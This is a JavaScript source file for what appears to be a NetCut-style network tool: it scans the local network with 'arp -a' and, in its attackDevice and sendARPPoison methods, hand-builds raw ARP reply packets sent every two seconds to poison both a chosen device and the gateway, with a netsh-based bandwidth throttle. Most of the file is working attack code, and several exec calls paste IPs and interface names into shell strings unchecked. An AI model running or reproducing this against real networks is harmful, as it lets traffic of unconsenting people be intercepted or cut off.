import { exec } from 'child_process';
import { promisify } from 'util';
import logger from './logger.js';
import raw from 'raw-socket';
import arp from 'node-arp';

const execAsync = promisify(exec);

class NetworkUtils {
    static async scanNetwork() {
        try {
            const { stdout } = await execAsync('arp -a');

            if (!stdout) {
                logger.warn('No ARP data returned');
                return [];
            }

            const devices = stdout
                .split('\n')
                .filter(line => line.includes('dynamic'))
                .map(line => {
                    const matches = line.match(/(\d+\.\d+\.\d+\.\d+)\s+([a-f0-9-]+)/i);
                    if (!matches) return null;

                    return {
                        ip: matches[1],
                        mac: matches[2].replace(/-/g, ':').toUpperCase(), // Normalize MAC
                        status: 'active'
                    };
                })
                .filter(Boolean);

            logger.info(`Found ${devices.length} devices`);
            return devices;
        } catch (error) {
            logger.error('Scan failed:', error);
            return [];
        }
    }

    static async attackDevice(targetIP, gatewayIP, ourMAC) {
        try {
            const socket = raw.createSocket({
                protocol: raw.Protocol.ARP,
                addressFamily: raw.AddressFamily.IPv4
            });

            const [targetMAC, gatewayMAC] = await Promise.all([
                this.getMACAddress(targetIP),
                this.getMACAddress(gatewayIP)
            ]);

            if (!targetMAC || !gatewayMAC) {
                throw new Error('MAC addresses not found');
            }

            let isAttacking = true;
            const attackInterval = setInterval(() => {
                if (!isAttacking) return;

                try {
                    // Poison target
                    this.sendARPPoison(socket, targetIP, targetMAC, gatewayIP, ourMAC);
                    // Poison gateway
                    this.sendARPPoison(socket, gatewayIP, gatewayMAC, targetIP, ourMAC);
                } catch (error) {
                    logger.error('Attack iteration failed:', error);
                }
            }, 2000);

            return {
                stop: () => {
                    isAttacking = false;
                    clearInterval(attackInterval);
                    socket.close();
                    logger.info('🛑 ARP attack stopped');
                },
                setBandwidth: async (limitKbps) => {
                    await this.setBandwidthLimit(targetIP, limitKbps);
                }
            };
        } catch (error) {
            logger.error('🔥 ARP attack initialization failed:', error);
            throw error;
        }
    }

    static sendARPPoison(socket, targetIP, targetMAC, spoofIP, ourMAC) {
        try {
            // Validate MAC addresses
            if (!targetMAC || !ourMAC || !targetMAC.includes(':') || !ourMAC.includes(':')) {
                throw new Error(`Invalid MAC addresses: target=${targetMAC}, our=${ourMAC}`);
            }

            // Validate IP addresses
            if (!targetIP || !spoofIP) {
                throw new Error(`Invalid IP addresses: target=${targetIP}, spoof=${spoofIP}`);
            }

            const packet = Buffer.alloc(42);

            // Ethernet Header
            targetMAC.split(':').forEach((oct, i) => packet[i] = parseInt(oct, 16)); // Destination MAC
            ourMAC.split(':').forEach((oct, i) => packet[6 + i] = parseInt(oct, 16)); // Source MAC
            packet.writeUInt16BE(0x0806, 12); // ARP Type

            // ARP Header
            packet.writeUInt16BE(0x0001, 14); // Hardware Type (Ethernet)
            packet.writeUInt16BE(0x0800, 16); // Protocol Type (IPv4)
            packet[18] = 6; // Hardware Size
            packet[19] = 4; // Protocol Size
            packet.writeUInt16BE(0x0002, 20); // Opcode (Reply)

            // Sender MAC/IP
            ourMAC.split(':').forEach((oct, i) => packet[22 + i] = parseInt(oct, 16));
            spoofIP.split('.').forEach((oct, i) => packet[28 + i] = parseInt(oct));

            // Target MAC/IP
            targetMAC.split(':').forEach((oct, i) => packet[32 + i] = parseInt(oct, 16));
            targetIP.split('.').forEach((oct, i) => packet[38 + i] = parseInt(oct));

            // Send the packet
            socket.send(packet, 0, packet.length, (error) => {
                if (error) logger.error('❌ ARP send failed:', error);
            });
        } catch (error) {
            logger.error('🔥 ARP Poison Error:', error.message);
        }
    }
    static async getGatewayInfo() {
        try {
            const { stdout } = await execAsync('ipconfig | findstr /i "Default Gateway"');
            const match = stdout.match(/\d+\.\d+\.\d+\.\d+/);
            if (!match) throw new Error('Gateway not found');
            const gateway = match[0];
            logger.info(`Gateway found: ${gateway}`);
            return { gateway };
        } catch (error) {
            logger.error('Failed to get gateway:', error);
            return null;
        }
    }

    static async getMACAddress(ip) {
        return new Promise((resolve, reject) => {
            arp.getMAC(ip, (err, mac) => {
                if (err || !mac) {
                    logger.error(`Failed to retrieve MAC for ${ip}`);
                    reject(err || new Error('No MAC found'));
                } else {
                    // Normalize MAC address format
                    const normalizedMAC = mac.replace(/-/g, ':').toUpperCase();
                    resolve(normalizedMAC);
                }
            });
        });
    }
    static async setBandwidthLimit(targetIP, limitKbps) {
        try {
            const interfaceName = await this.getNetworkInterface();
            await execAsync(`netsh interface ipv4 set subinterface "${interfaceName}" throttling=${limitKbps}`);
            logger.info(`Bandwidth limited to ${limitKbps}Kbps for ${targetIP}`);
        } catch (error) {
            logger.error('Failed to set bandwidth limit:', error);
        }
    }

    static async checkDeviceStatus(ip) {
        return new Promise((resolve) => {
            exec(`ping -n 1 ${ip}`, (error, stdout) => {
                resolve(!error && stdout.includes('TTL='));
            });
        });
    }

    static async getNetworkInterface() {
        try {
            const { stdout } = await execAsync('netsh interface show interface');
            const lines = stdout.split('\n');
            const activeLine = lines.find(line => line.includes('Connected'));
            if (!activeLine) throw new Error('No active interface found');
            return activeLine.trim().split(/\s+/).pop();
        } catch (error) {
            logger.error('Failed to get network interface:', error);
            throw error;
        }
    }

    static async getBandwidthUsage(ip) {
        try {
            const interfaceName = await this.getNetworkInterface();
            const command = process.platform === 'win32'
                ? `powershell "Get-NetAdapterStatistics -Name '${interfaceName}' | Select-Object -ExpandProperty ReceivedBytes, SentBytes"`
                : `ifstat -i ${interfaceName} 1 1 | tail -n 1`;

            const { stdout } = await execAsync(command);
            const [download, upload] = stdout.match(/\d+/g).map(Number);

            return { download, upload };
        } catch (error) {
            logger.error('Bandwidth check failed:', error);
            return { download: 0, upload: 0 };
        }
    }
}

export default NetworkUtils;